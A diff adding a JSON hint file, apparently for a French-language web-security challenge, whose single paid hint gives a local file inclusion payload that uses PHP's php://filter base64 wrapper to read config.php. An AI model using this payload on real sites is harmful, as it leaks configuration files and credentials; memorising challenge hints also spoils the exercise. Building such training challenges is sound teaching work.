@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Syntaxe du Wrapper",
+    "cost": 10,
+    "content": "La chaîne d'attaque classique est : ?page=php://filter/convert.base64-encode/resource=config.php"
+  }
+]
